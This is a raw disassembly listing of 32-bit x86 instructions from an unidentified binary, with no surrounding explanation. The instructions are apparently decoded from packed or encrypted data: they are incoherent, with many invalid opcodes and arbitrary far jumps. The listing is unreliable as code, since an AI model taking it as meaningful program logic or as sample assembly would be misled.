  415a39:	loope  0x415a7d
  415a3b:	jmp    0x4159dd
  415a3d:	imul   esi,DWORD PTR [esi],0xffffffb1
  415a40:	cwde   
  415a41:	mov    edi,0x672713da
  415a46:	xor    al,0xd
  415a48:	jl     0x415a15
  415a4a:	adc    DWORD PTR [ebp-0x65],esi
  415a4d:	sub    al,0x2d
  415a4f:	xchg   ebp,eax
  415a50:	sbb    al,0x21
  415a52:	mov    BYTE PTR [eax+0xd02ff3c],cl
  415a58:	aad    0x34
  415a5a:	inc    ebx
  415a5b:	adc    ebp,esp
  415a5d:	ret    
  415a5e:	xchg   esp,eax
  415a5f:	enter  0xf471,0x4c
  415a63:	test   DWORD PTR [eax],edi
  415a65:	fwait
  415a66:	rcr    ebx,1
  415a68:	jle    0x415a7e
  415a6a:	sub    bh,bh
  415a6c:	adc    BYTE PTR [eax],ah
  415a6e:	add    cl,dl
  415a70:	aam    0x79
  415a72:	les    ebx,FWORD PTR [ebx]
  415a74:	les    ebx,FWORD PTR [esi-0x2c]
  415a77:	push   0xffffffe6
  415a79:	aaa    
  415a7a:	xchg   edx,eax
  415a7b:	aas    
  415a7c:	xchg   edx,eax
  415a7d:	je     0x415a5c
  415a7f:	xchg   esi,edi
  415a81:	jns    0x415a1e
  415a83:	aas    
  415a84:	sub    DWORD PTR [eax],0x11
  415a87:	jns    0x415a30
  415a89:	lods   al,BYTE PTR ds:[esi]
  415a8b:	mov    ebx,0x4633f1a6
  415a90:	xchg   ecx,eax
  415a91:	mov    al,0x12
  415a93:	adc    eax,0xc8e90351
  415a98:	retf   
  415a99:	push   eax
  415a9a:	pop    esi
  415a9b:	jo     0x415af7
  415a9d:	mov    ecx,edi
  415a9f:	adc    eax,0x253ca511
  415aa4:	pop    esp
  415aa5:	(bad)  
  415aa6:	addr16 ss cs pop ecx
  415aaa:	xchg   ebx,eax
  415aab:	add    eax,0x24b1882f
  415ab0:	jge    0x415b16
  415ab2:	mov    ecx,0x9c1ef565
  415ab7:	or     ebp,DWORD PTR [edi+0x1be6d39f]
  415abd:	jnp    0x415a44
  415abf:	pop    es
  415ac0:	or     eax,0x7d68171
  415ac5:	mov    cl,0x17
  415ac7:	stc    
  415ac8:	out    dx,al
  415ac9:	jbe    0x415aff
  415acb:	(bad)  
  415acc:	fs retf 0x7bca
  415ad0:	sub    al,0x1e
  415ad2:	mov    al,BYTE PTR [ebp+0x2]
  415ad5:	arpl   WORD PTR [ecx+0x55],sp
  415ad8:	loopne 0x415ae0
  415ada:	dec    ebx
  415adb:	jmp    0x38e467e2
  415ae0:	push   es
  415ae1:	fnstcw WORD PTR [esi]
  415ae3:	test   eax,0x47a529d5
  415ae8:	stc    
  415ae9:	(bad)
  415aec:	retf   0xf9fe
  415aef:	sbb    bh,dh
  415af1:	add    al,0xce
  415af3:	ffree  st(2)
  415af5:	xor    dh,dl
  415af7:	iret   
  415af8:	je     0x415aa6
  415afa:	loop   0x415b02
  415afc:	retf   0x8025
  415aff:	mov    eax,ds:0x60b30fa0
  415b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b05:	pop    es
  415b06:	or     al,0xe7
  415b08:	mov    al,ds:0x3f4154fa
  415b0d:	xchg   edi,eax
  415b0e:	mov    ebx,0xc5a1
	...
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fadd   QWORD PTR [ecx+eiz*8]
  415b82:	mov    ds:0xe53bd9,al
  415b87:	add    BYTE PTR ds:0x26000001,al
  415b8d:	jns    0x415b52
  415b8f:	arpl   WORD PTR [edi],bp
  415b91:	push   ebx
  415b92:	xchg   esp,eax
  415b93:	fcmovbe st,st(5)
  415b95:	push   esi
  415b96:	push   ebx
  415b97:	rol    BYTE PTR [ecx-0x3dcf833a],0x8b
  415b9e:	lods   al,BYTE PTR ds:[esi]
  415b9f:	jle    0x415be7
  415ba1:	clc    
  415ba2:	dec    ebx
  415ba3:	push   0x5a01373e
  415ba8:	sbb    DWORD PTR [ecx+ebp*4],0xc8b98a6b
  415baf:	ss mov edx,0xc29dd697
  415bb5:	mov    esp,0x75f8b138
  415bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bbb:	mov    dh,0xd6
  415bbd:	imul   DWORD PTR [ecx]
  415bbf:	mov    edx,ecx
  415bc1:	jae    0x415b9f
  415bc3:	loopne 0x415bdf
  415bc5:	jge    0x415b6e
  415bc7:	or     al,0x73
  415bc9:	mov    eax,ds:0x97e08fd0
  415bce:	adc    bh,BYTE PTR ds:0xda6a82db
  415bd4:	pop    ebp
  415bd5:	ja     0x415b71
  415bd7:	mov    eax,DWORD PTR [eax-0x85ad712]
  415bdd:	ret    
  415bde:	xchg   edx,eax
  415bdf:	loope  0x415c5b
  415be1:	addr16 ror ebp,1
  415be4:	call   0x66e701b8
  415be9:	jecxz  0x415c65
  415beb:	mov    dh,0xc9
  415bed:	mov    ax,ds:0x408166bf
  415bf3:	lock repnz xlat BYTE PTR ds:[ebx]
  415bf6:	ja     0x415c0c
  415bf8:	test   DWORD PTR [ebp+0x68],ebp
  415bfb:	(bad)  
  415bfc:	xchg   ecx,eax
  415bfd:	sub    al,0x47
  415bff:	(bad)  
  415c01:	cmp    esi,DWORD PTR [edx]
  415c03:	jne    0x415c0a
  415c05:	(bad)  
  415c06:	dec    edx
  415c07:	cmp    ebp,DWORD PTR [ebx-0x4422b2eb]
  415c0d:	out    dx,eax
  415c0e:	inc    ebx
  415c0f:	or     esp,DWORD PTR [edx]
  415c11:	fdivr  st,st(2)
  415c13:	and    esp,DWORD PTR [edx+0x20]
  415c16:	sbb    ebx,DWORD PTR [edi+ecx*4-0xb]
  415c1a:	lea    esi,[edi+0x28]
  415c1d:	(bad)  
  415c1e:	and    cl,BYTE PTR [edi+0x35a6df]
  415c24:	jle    0x415bb7
  415c26:	std    
  415c27:	outs   dx,BYTE PTR ds:[esi]
  415c28:	add    BYTE PTR [ebp+0x57707b1b],dh
  415c2e:	int3   
  415c2f:	and    eax,0x9d6b73c5
  415c34:	fadd   QWORD PTR [ebx]
  415c36:	rcr    ah,cl
  415c38:	mov    eax,DWORD PTR [ebx-0x1b872ad2]
  415c3e:	retf   
  415c3f:	jmp    0xa977:0xc2ef972b
  415c46:	jns    0x415c37
  415c48:	inc    ebp
  415c49:	push   edx
  415c4a:	dec    esi
  415c4b:	pop    esp
  415c4c:	loope  0x415bf6
  415c4e:	xor    BYTE PTR [ebp-0x6dea3f80],0x5a
  415c55:	inc    edx
  415c56:	(bad)  
  415c58:	(bad)  
  415c59:	pop    eax
  415c5a:	mov    edx,0x4c03495c
  415c5f:	into   
  415c60:	adc    al,0xcb
  415c62:	pop    ss
  415c63:	mov    dl,0x37
  415c65:	pop    esp
  415c66:	pop    edi
  415c67:	jmp    0x80b8:0x1f394f08
  415c6e:	add    DWORD PTR [edi],ebp
  415c70:	inc    ecx
  415c71:	mov    esp,0xbc2df037
  415c76:	and    BYTE PTR [ebx+ecx*1+0x1c],ah
  415c7a:	dec    eax
  415c7b:	cmp    eax,0x24859686
  415c80:	lods   al,BYTE PTR ds:[esi]
  415c81:	jge    0x415c4a
  415c83:	push   0x62
  415c85:	dec    dl
  415c87:	mov    edx,0x95db07b1
  415c8c:	aaa    
  415c8d:	mov    ?,WORD PTR [eax]
  415c8f:	inc    eax
  415c90:	into   
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x84b1781f
  415d03:	sbb    DWORD PTR [eax-0x1a],eax
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    eax,0xed000001
  415d0d:	mov    ebx,edi
  415d0f:	mov    eax,ds:0x8c07649
  415d14:	jmp    0x5d04:0xa111c297
  415d1b:	loopne 0x415cad
  415d1d:	icebp  
  415d1e:	xor    BYTE PTR [eax+0x26d01b01],al
  415d24:	std    
  415d25:	ss xor al,0x77
  415d28:	retf   0xce07
  415d2b:	jp     0x415d70
  415d2d:	sub    ebx,ecx
  415d2f:	jo     0x415cf6
  415d31:	inc    esi
  415d32:	or     eax,0xcf43f111
  415d37:	icebp  
  415d38:	hlt    
  415d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d3a:	adc    ecx,DWORD PTR [ecx-0x70afb43b]
  415d40:	mov    edi,0xebe3802f
  415d45:	icebp  
  415d46:	xchg   ecx,eax
  415d47:	add    BYTE PTR [edx],bh
  415d49:	inc    esp
  415d4a:	test   ebp,0x9f996563
  415d50:	jg     0x415d3b
  415d52:	adc    DWORD PTR [ecx+0x14],edx
  415d55:	cmp    DWORD PTR [ebx+0x52],ebx
  415d58:	pop    es
  415d59:	sub    al,0xf8
  415d5b:	cmp    BYTE PTR [edx-0x22],dh
  415d5e:	mov    DWORD PTR [edi],esp
  415d60:	jmp    0xd77a:0x15e271a7
  415d67:	retf   
  415d68:	jo     0x415dc7
  415d6a:	and    al,0x6a
  415d6c:	mov    cl,0xc1
  415d6e:	pusha  
  415d6f:	(bad)  
  415d70:	mov    ds:0x266cc27c,al
  415d75:	add    ecx,ebp
  415d77:	sbb    al,0x63
  415d79:	sub    bl,BYTE PTR [edx]
  415d7b:	xor    eax,0x7496ffe
  415d80:	fwait
  415d81:	push   esp
  415d82:	mov    al,ds:0x5e71e106
  415d87:	xor    edx,DWORD PTR [ecx-0x52174607]
  415d8d:	jnp    0x415dbd
  415d8f:	sub    al,0x49
  415d91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d92:	xchg   ebp,eax
  415d93:	fistp  WORD PTR [ebp+0x267dbaf6]
  415d99:	std    
  415d9a:	stc    
  415d9b:	mov    WORD PTR [esp+edi*8-0x2e67a103],?
  415da2:	lods   al,BYTE PTR ds:[esi]
  415da3:	push   edx
  415da4:	fsubr  QWORD PTR [edi+0x4d87d9b4]
  415daa:	add    ebp,DWORD PTR fs:[ebx-0x5f8a66bd]
  415db1:	cmp    eax,0xd0658c58
  415db6:	xchg   ecx,eax
  415db7:	sub    DWORD PTR ds:0x367e00cc,edx
  415dbd:	shr    BYTE PTR [ebp-0x76],1
  415dc0:	outs   dx,BYTE PTR ds:[esi]
  415dc1:	pop    ss
  415dc2:	fbld   TBYTE PTR [ebx-0x7a]
  415dc5:	cdq    
  415dc6:	retf   0x82dd
  415dc9:	loop   0x415d76
  415dcb:	rol    BYTE PTR [ebp-0x73],cl
  415dce:	outs   dx,DWORD PTR ds:[esi]
  415dcf:	aas    
  415dd0:	icebp  
  415dd1:	cmp    BYTE PTR [ebp-0x5],bh
  415dd4:	xor    ch,BYTE PTR [edi+0xde770a0]
  415dda:	daa    
  415ddb:	enter  0x5814,0x68
  415ddf:	push   0xb7910c91
  415de4:	popf   
  415de5:	in     al,dx
  415de6:	inc    ebx
  415de7:	push   edi
  415de8:	push   cs
  415de9:	cdq    
  415dea:	add    cl,BYTE PTR [ecx-0x4]
  415ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dee:	inc    edi
  415def:	sbb    ax,0xe3ed
  415df3:	fadd   DWORD PTR [ebp+0x2265f1c0]
  415df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dfa:	pushf  
  415dfb:	dec    ecx
  415dfc:	sbb    esp,DWORD PTR [eax]
  415dfe:	push   cs
  415dff:	out    dx,eax
  415e00:	enter  0xba6,0x56
  415e04:	out    dx,al
  415e05:	das    
  415e06:	dec    ebp
  415e07:	jnp    0x415e39
  415e09:	xlat   BYTE PTR ds:[ebx]
  415e0a:	mov    cl,0x6c
  415e0c:	jp     0x415db2
  415e0e:	gs scas al,BYTE PTR es:[edi]
  415e10:	arpl   WORD PTR [eax],ax
	...
  415e72:	add    BYTE PTR [eax],al
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x69]
  415e81:	fcom   QWORD PTR [esi+ebp*8+0x45]
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR ds:0x10000001,al
  415e8d:	leave  
  415e8e:	jge    0x415e42
  415e90:	dec    ebp
  415e91:	or     al,dl
  415e93:	sbb    dl,BYTE PTR [esi-0x538edce5]
  415e99:	jle    0x415e5c
  415e9b:	jae    0x415ecb
  415e9d:	test   DWORD PTR [esi],ecx
  415e9f:	jmp    DWORD PTR [ecx]
  415ea1:	mov    bl,BYTE PTR ds:0xa31b1383
  415ea7:	cli    
  415ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ea9:	out    dx,al
  415eaa:	mov    bl,0xd4
  415eac:	push   ecx
  415ead:	shr    DWORD PTR [edi-0x37a1aced],1
  415eb3:	arpl   WORD PTR [ebp-0x36],ax
  415eb6:	mov    ch,0x43
  415eb8:	retf   
  415eb9:	loopne 0x415f19
  415ebb:	jno    0x415f23
  415ebd:	add    edx,DWORD PTR [eax+0x36ac1ee3]
  415ec3:	push   eax
  415ec4:	enter  0x68d8,0xfc
  415ec8:	pop    ebx
  415ec9:	mov    eax,0xe1961b67
  415ece:	aad    0x84
  415ed0:	fwait
  415ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed2:	dec    esp
  415ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ed4:	dec    eax
  415ed5:	jle    0x415edb
  415ed7:	es push ds
  415ed9:	cmp    BYTE PTR [ebp+0x27344087],ah
  415edf:	cmp    edi,esi
  415ee1:	popf   
  415ee2:	jb     0x415e6d
  415ee4:	lock rcr BYTE PTR [eax-0x497a6883],cl
  415eeb:	cwde   
  415eec:	sub    BYTE PTR [ebx-0x694c620e],ch
  415ef2:	mov    al,ds:0x4ba371be
  415ef7:	ja     0x415ef6
  415ef9:	cmc    
  415efa:	dec    esi
  415efb:	sbb    DWORD PTR [eax-0x43336118],ecx
  415f01:	rcl    BYTE PTR [esi],1
  415f03:	je     0x415ede
  415f05:	adc    dl,BYTE PTR [edi-0x317d22e8]
  415f0b:	fsubr  DWORD PTR [edi]
  415f0d:	test   eax,0xeadc607
  415f12:	jne    0x415f76
  415f14:	xchg   edx,eax
  415f15:	imul   ebx,DWORD PTR [ebp-0x55d4a360],0xe54bbde0
  415f1f:	in     eax,0xf8
  415f21:	mov    ds:0xfda4897c,eax
  415f26:	in     al,dx
  415f27:	jg     0x415f1f
  415f29:	sar    BYTE PTR [ebp+0x1],1
  415f2c:	(bad)  
  415f2d:	push   ebx
  415f2e:	and    al,BYTE PTR [edx-0x2e88a85a]
  415f34:	add    esp,DWORD PTR [edi-0x3d]
  415f37:	aad    0x3e
  415f39:	and    al,0x7a
  415f3b:	adc    DWORD PTR [esi],esp
  415f3d:	repnz leave 
  415f3f:	sub    dl,BYTE PTR cs:[edi+eiz*8]
  415f43:	cmp    ebx,DWORD PTR [ecx-0x3c]
  415f46:	mov    esp,0x212d6b54
  415f4b:	jl     0x415f4a
  415f4d:	pop    esp
  415f4e:	cli    
  415f4f:	dec    ebp
  415f50:	and    ebp,DWORD PTR [edi+0x16]
  415f53:	scas   eax,DWORD PTR es:[edi]
  415f54:	sbb    BYTE PTR [edx+edi*2],bl
  415f57:	iret   
  415f58:	ins    BYTE PTR es:[edi],dx
  415f59:	test   al,0xb8
  415f5b:	jl     0x415f39
  415f5d:	out    dx,eax
  415f5e:	sub    cl,BYTE PTR [edi]
  415f60:	or     esp,DWORD PTR [ecx]
  415f62:	lea    edi,[ebp-0x6b]
  415f65:	ss scas eax,DWORD PTR es:[edi]
  415f67:	or     BYTE PTR ds:[esi-0xa],bh
  415f6b:	mov    al,0x7e
  415f6d:	xchg   esi,eax
  415f6e:	fisubr WORD PTR [edi-0x1a55f4f9]
  415f74:	pop    edx
  415f75:	add    eax,DWORD PTR [ebp-0x1f]
  415f78:	cmp    DWORD PTR [esi-0x1cd1e963],esp
  415f7e:	jg     0x415fe7
  415f80:	mov    ah,0x3d
  415f82:	test   ax,0xd7a
  415f86:	repnz dec eax
  415f88:	mov    esi,0x9bc164dd
  415f8d:	mov    edi,gs
  415f8f:	xchg   edx,eax
  415f90:	sbb    eax,DWORD PTR [eax]
	...
  415ff2:	add    BYTE PTR [eax],al
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	push   si
  416002:	sar    DWORD PTR [ecx],cl
  416004:	dec    edx
  416005:	call   0x146600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	and    DWORD PTR [ebx+edi*8],ecx
  41600f:	test   esp,ecx
  416011:	add    dh,BYTE PTR [esp+ebx*2-0x520ac12d]
  416018:	cwde   
  416019:	fs mov bl,0xbb
  41601c:	xchg   ebp,eax
  41601d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41601e:	mov    ecx,0xe21afb30
  416023:	add    bh,BYTE PTR [edx-0x41]
  416026:	nop
  416027:	(bad)  
  416028:	mov    dh,0xf7
  41602a:	popa   
  41602b:	adc    BYTE PTR [esi+0x3588c0c3],0x65
  416032:	sub    BYTE PTR [eax+0x13],ah
  416035:	icebp  
  416036:	fld    QWORD PTR [edi+0x14a4bfae]
  41603c:	mov    ecx,0x9800c378
  416041:	sti    
  416042:	or     edx,ecx
  416044:	fcmovbe st,st(6)
  416046:	ins    BYTE PTR es:[edi],dx
  416047:	(bad)  
  416048:	shl    DWORD PTR [edi],cl
  41604a:	ret    
  41604b:	aas    
  41604c:	sbb    eax,0xfafdb8db
  416051:	sti    
  416052:	bnd jge 0x4160b4
  416055:	cmp    eax,0x75ecaa2c
  41605a:	div    esi
  41605c:	jb     0x415fe4
  41605e:	je     0x416083
  416060:	int3   
  416061:	and    ebp,esp
  416063:	test   al,0xbe
  416065:	aad    0xc
  416067:	icebp  
  416068:	mov    DWORD PTR [ebp-0x397735ab],0x7b8365ed
  416072:	dec    ecx
  416073:	std    
  416074:	in     al,0x83
  416076:	aam    0x8c
  416078:	pop    edx
  416079:	mov    esi,DWORD PTR [esp+edx*8+0x27]
  41607d:	data16 xor bh,BYTE PTR [esi+0x4d]
  416081:	sub    ebp,DWORD PTR [edx+0x4b6cccc0]
  416087:	aam    0x76
  416089:	lea    eax,[eax]
  41608b:	adc    edx,ebp
  41608d:	call   0xa70b920a
  416092:	pop    ds
  416093:	jl     0x416039
  416095:	sbb    DWORD PTR [eax+0x0],ecx
  416098:	mov    ds:0x44783a6e,al
  41609d:	push   ss
  41609e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41609f:	xchg   ecx,eax
  4160a0:	mov    al,ds:0xa714cc4e
  4160a5:	ja     0x416087
  4160a7:	fbstp  TBYTE PTR [edi+0x53aa5ec1]
  4160ad:	test   al,0xc8
  4160b0:	add    dl,BYTE PTR [edx+0x2e1dbd1b]
  4160b6:	and    al,0xe7
  4160b8:	add    eax,0xfd78a1a6
  4160bd:	sbb    ebp,ecx
  4160bf:	and    eax,0x89dcd1af
  4160c4:	xor    BYTE PTR [esi+0x2e],al
  4160c7:	aam    0xa5
  4160c9:	add    BYTE PTR [esi-0x5377f3e],cl
  4160cf:	call   0xdec0:0x6ab82df4
  4160d6:	int    0xfb
  4160d8:	fisttp WORD PTR [eax-0x28]
  4160db:	(bad)  
  4160dc:	retf   0x7b5c
  4160df:	je     0x416147
  4160e1:	add    bl,BYTE PTR [edi+0x7f39c6db]
  4160e7:	popf   
  4160e8:	mov    ebp,0xbb286fb9
  4160ed:	popa   
  4160ee:	pop    ebx
  4160ef:	jns    0x416161
  4160f1:	fwait
  4160f2:	inc    edi
  4160f3:	stos   BYTE PTR es:[edi],al
  4160f4:	push   0xfffffff0
  4160f6:	std    
  4160f7:	adc    eax,0x2dc0dbb0
  4160fc:	rcl    ebx,cl
  4160fe:	das    
  4160ff:	or     bl,BYTE PTR [edx]
  416101:	mov    ds:0x60c1c546,al
  416106:	xchg   ebx,eax
  416107:	mov    al,ds:0xa1952b59
  41610c:	jmp    0xfbf2f7d6
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x712557f3
  416183:	jno    0x4161d4
  416185:	jmp    0x146618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	jecxz  0x41615a
  41618e:	add    bl,BYTE PTR [eax-0x5]
  416191:	jo     0x41615d
  416193:	fnstcw WORD PTR [edx+0x444d8a5b]
  416199:	pop    es
  41619a:	fst    DWORD PTR [edx+0x5cf97a4c]
  4161a0:	cli    
  4161a1:	out    0x57,al
  4161a3:	in     eax,dx
  4161a4:	lods   al,BYTE PTR ds:[esi]
  4161a5:	leave  
  4161a6:	push   es
  4161a7:	push   esp
  4161a8:	and    dl,0xc2
  4161ab:	mov    ah,0xb1
  4161ad:	das    
  4161ae:	sub    ch,BYTE PTR [esi-0x6bbaa377]
  4161b4:	pop    ebx
  4161b5:	hlt    
  4161b6:	mov    edi,0x6d69e03a
  4161bb:	mov    ds:0x5964bd38,al
  4161c0:	pop    es
  4161c1:	adc    al,0xb1
  4161c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161c4:	rcr    DWORD PTR [edx-0x1f6b2e30],1
  4161ca:	adc    eax,0xe6f81bb7
  4161cf:	mov    edx,0x9a130aee
  4161d4:	pop    ebx
  4161d5:	jae    0x416251
  4161d7:	sar    ebx,1
  4161d9:	arpl   WORD PTR [eax+0x405ae003],si
  4161df:	rcr    DWORD PTR [edx+0x27],cl
  4161e2:	mov    DWORD PTR [ebx-0x73dbec54],eax
  4161e8:	popa   
  4161e9:	push   es
  4161ea:	add    BYTE PTR [eax+0x23],0xc0
  4161ee:	out    0x2d,eax
  4161f0:	sbb    ch,bl
  4161f2:	rcl    DWORD PTR [ecx-0x592767ad],0x80
  4161f9:	or     bh,BYTE PTR [esp+eax*2]
  4161fc:	add    BYTE PTR [ebp+0x11],bl
  4161ff:	pop    ecx
  416200:	scas   al,BYTE PTR es:[edi]
  416201:	jne    0x416235
  416203:	mov    eax,0xfe0c5546
  416208:	test   eax,0x40f4c064
  41620d:	xchg   ecx,eax
  41620f:	shr    BYTE PTR ds:0xa56a75ef,cl
  416215:	dec    eax
  416216:	and    BYTE PTR [edx],al
  416218:	nop
  416219:	mov    dh,0x82
  41621b:	pop    ebx
  41621c:	popf   
  41621d:	dec    esp
  41621e:	(bad)  
  41621f:	jae    0x416204
  416221:	push   esi
  416222:	mov    dl,BYTE PTR [edi+0x1196d62f]
  416228:	cwde   
  416229:	add    DWORD PTR ds:0xa948a0c7,ebp
  41622f:	cmp    DWORD PTR [ecx],0xffffffe9
  416232:	sub    eax,0x64ad503
  416237:	jb     0x41623d
  416239:	add    eax,0x9f35658d
  41623e:	cld    
  41623f:	adc    al,BYTE PTR [ebx+0x4b1a0d6b]
  416245:	arpl   WORD PTR [eax],ax
  416247:	adc    BYTE PTR [esi-0x25],al
  41624a:	aaa    
  41624b:	mov    dh,0x43
  41624d:	pop    eax
  41624e:	mov    al,0x29
  416250:	outs   dx,DWORD PTR ds:[esi]
  416251:	and    ebx,ecx
  416253:	mov    ds:0xc6285a38,al
  416258:	mov    ebx,0xae14c65d
  41625d:	(bad)  
  41625e:	div    DWORD PTR [edx]
  416260:	mov    bh,BYTE PTR [ecx]
  416262:	sub    DWORD PTR [ebp+0x23f07948],0xe
  416269:	iret   
  41626a:	or     eax,0x689cbe92
  41626f:	xchg   ecx,eax
  416270:	imul   esp,esp,0x10
  416273:	in     eax,dx
  416274:	popf   
  416275:	out    0xb6,al
  416277:	fldcw  WORD PTR [edi-0x3f6b013f]
  41627d:	outs   dx,BYTE PTR ds:[esi]
  41627e:	inc    esp
  41627f:	mov    cl,0xa7
  416281:	out    0x2b,al
  416283:	retf   0xa1bf
  416286:	(bad)  
  416287:	sahf   
  416288:	pop    ecx
  416289:	sti    
  41628a:	shl    bl,cl
  41628c:	repz fyl2xp1 
  41628f:	mov    edi,0xe9
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x54d7:0x935e72ee
  416305:	jmp    0x0:0x1050000
  41630c:	inc    esi
  41630d:	pop    ebp
  41630e:	scas   eax,DWORD PTR es:[di]
  416310:	xor    ch,0xbe
  416313:	jmp    0x63baed7e
  416318:	sub    al,0x15
  41631a:	inc    eax
  41631b:	mov    ecx,DWORD PTR [eax+0xe]
  41631e:	lods   eax,DWORD PTR ds:[esi]
  41631f:	dec    ecx
  416320:	out    0xa9,al
  416322:	sbb    BYTE PTR [esp+ebx*4],ch
  416325:	mov    ecx,DWORD PTR [ecx]
  416327:	sti    
  416328:	leave  
  416329:	(bad)  
  41632a:	icebp  
  41632b:	mov    edi,0x62be40ef
  416330:	or     DWORD PTR [esi-0xf],0xa50d9d12
  416337:	es adc al,0x4
  41633a:	mov    al,0xb
  41633c:	rsqrtps xmm5,XMMWORD PTR [esp+esi*4]
  416340:	pushf  
  416341:	mov    edx,esp
  416343:	ins    BYTE PTR es:[edi],dx
  416344:	push   ecx
  416345:	jp     0x416348
  416347:	cmp    al,0x15
  416349:	sbb    DWORD PTR [ebx],esi
  41634b:	aam    0x32
  41634d:	mov    ah,0xab
  41634f:	push   edi
  416350:	pop    ds
  416351:	dec    esp
  416352:	(bad)  
  416353:	scas   eax,DWORD PTR es:[edi]
  416354:	inc    ebp
  416355:	xor    esi,ebp
  416357:	push   esi
  416358:	pop    edi
  416359:	dec    edx
  41635a:	add    DWORD PTR [esi],edi
  41635c:	pop    esi
  41635d:	jno    0x416389
  41635f:	leave  
  416360:	dec    ebx
  416361:	adc    eax,0x6342a433
  416366:	adc    al,BYTE PTR [ecx-0x24]
  416369:	and    dl,al
  41636b:	dec    edx
  41636c:	pushf  
  41636d:	dec    ebp
  41636e:	sti    
  41636f:	imul   ecx,DWORD PTR ds:0x6320c899,0xffffff8b
  416376:	sub    BYTE PTR [esi],cl
  416378:	jb     0x41632d
  41637a:	pop    ds
  41637b:	mov    bh,0x4d
  41637d:	data16 add BYTE PTR [ebx-0x71],dh
  416381:	mov    dl,0x6a
  416383:	adc    edi,ebx
  416385:	push   ds
  416386:	popa   
  416387:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416389:	mov    eax,0x1f7dfc58
  41638e:	adc    eax,0x532cf6ef
  416393:	into   
  416394:	add    bl,al
  416396:	mov    eax,0x635d7f61
  41639b:	(bad)  
  41639d:	xchg   ebp,eax
  41639e:	inc    ebx
  41639f:	jno    0x4163a8
  4163a1:	iret   
  4163a2:	push   esi
  4163a3:	pop    edx
  4163a4:	leave  
  4163a5:	repnz ss (bad) 
  4163a8:	dec    ecx
  4163a9:	fst    QWORD PTR [esi]
  4163ab:	and    eax,0x74b853d4
  4163b0:	push   esp
  4163b1:	repnz ss mov dh,0xdf
  4163b5:	push   ebx
  4163b6:	sbb    cl,BYTE PTR ss:[ecx]
  4163b9:	(bad)  
  4163ba:	sub    al,0x8c
  4163bc:	lds    edx,FWORD PTR [edi+0x5a256412]
  4163c2:	cmp    eax,edi
  4163c4:	(bad)  
  4163c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163c6:	pmullw mm2,QWORD PTR [ecx+ecx*8+0x28]
  4163cb:	enter  0xed87,0xed
  4163cf:	and    al,0xbe
  4163d1:	arpl   WORD PTR [eax-0x2d96b74],bp
  4163d7:	mov    esi,ecx
  4163d9:	pop    ds
  4163da:	inc    eax
  4163db:	push   esp
  4163dc:	int    0x42
  4163de:	pop    ebx
  4163df:	rol    DWORD PTR ds:0xed9f1a8,cl
  4163e5:	pop    edx
  4163e6:	sub    ah,dh
  4163e8:	jae    0x4163aa
  4163ea:	xchg   BYTE PTR [eax+0x7a3f1e61],bh
  4163f0:	rol    BYTE PTR [edi+eiz*2-0x519836],0x32
  4163f8:	popa   
  4163f9:	call   0x997c:0x967cb116
  416400:	or     BYTE PTR [ecx],dh
  416402:	in     eax,dx
  416403:	stc    
  416404:	adc    al,0x54
  416406:	jo     0x4163be
  416408:	sbb    edi,esp
  41640a:	stos   DWORD PTR es:[edi],eax
  41640b:	dec    ecx
  41640c:	push   edx
  41640d:	(bad)  
  41640f:	xor    ch,BYTE PTR [eax+0x0]
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	inc    eax
  416481:	jb     0x416418
  416483:	enter  0xeb59,0x0
  416487:	add    BYTE PTR ds:0xd5000001,al
  41648d:	mov    al,0xe6
  41648f:	and    edi,DWORD PTR [ebp+0x50]
  416492:	scas   eax,DWORD PTR es:[edi]
  416493:	mov    ebx,eax
  416495:	or     eax,0x1579eeb6
  41649a:	mov    edx,0x16255450
  41649f:	xor    BYTE PTR [ecx],al
  4164a1:	sub    BYTE PTR [ebx],ch
  4164a3:	jo     0x4164b9
  4164a5:	xchg   ebp,eax
  4164a6:	and    eax,0x64cde1d9
  4164ab:	inc    eax
  4164ac:	mov    dl,0x3a
  4164ae:	bound  edx,QWORD PTR [ecx-0x55]
  4164b1:	pop    ecx
  4164b2:	lea    esp,[edx+0x21aa92f0]
